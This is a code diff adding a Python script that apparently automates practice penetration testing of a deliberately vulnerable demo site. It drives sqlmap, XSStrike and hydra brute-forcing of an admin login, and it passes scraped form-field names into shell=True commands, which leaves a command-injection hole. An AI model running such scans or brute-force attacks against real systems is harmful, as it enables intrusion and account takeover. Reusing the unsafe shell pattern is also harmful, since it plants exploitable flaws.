@@ -1,0 +1,72 @@
+import subprocess
+import requests
+from bs4 import BeautifulSoup
+
+# Helper function to run a command and capture output
+def run_command(command):
+    result = subprocess.run(command, capture_output=True, text=True, shell=True)
+    return result.stdout
+
+# SQL Injection Testing
+def test_sql_injection(url):
+    print(f"Testing SQL Injection on {url}")
+    command = f"sqlmap -u '{url}' --batch --level=3"
+    output = run_command(command)
+    print(output)
+
+# Cross-Site Scripting (XSS) Testing
+def test_xss(url):
+    print(f"Testing XSS on {url}")
+    command = f"python3 xsstrike.py -u '{url}' --crawl"
+    output = run_command(command)
+    print(output)
+
+# Insecure Authentication Testing
+def test_insecure_authentication(url, username, password_list):
+    print(f"Testing Insecure Authentication on {url}")
+    command = f"hydra -l {username} -P {password_list} {url} http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'"
+    output = run_command(command)
+    print(output)
+
+# Discover Input Fields
+def discover_input_fields(url):
+    response = requests.get(url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    forms = soup.find_all('form')
+    inputs = []
+    for form in forms:
+        action = form.get('action')
+        method = form.get('method')
+        for input_tag in form.find_all('input'):
+            name = input_tag.get('name')
+            input_type = input_tag.get('type')
+            inputs.append({'action': action, 'method': method, 'name': name, 'type': input_type})
+    return inputs
+
+# Main function to perform penetration testing
+def main():
+    url = "http://testphp.vulnweb.com/"
+    username = "admin"
+    password_list = "C:/Users/keert/Desktop/password.txt"
+
+    # Discover input fields
+    print("Discovering input fields...")
+    inputs = discover_input_fields(url)
+    for input_field in inputs:
+        print(f"Found input field: {input_field}")
+
+    # Test SQL Injection
+    for input_field in inputs:
+        if input_field['type'] == 'text':
+            test_sql_injection(f"{url}?{input_field['name']}=1")
+
+    # Test XSS
+    for input_field in inputs:
+        if input_field['type'] == 'text':
+            test_xss(f"{url}?{input_field['name']}=test")
+
+    # Test Insecure Authentication
+    test_insecure_authentication(url, username, password_list)
+
+if __name__ == "__main__":
+    main()
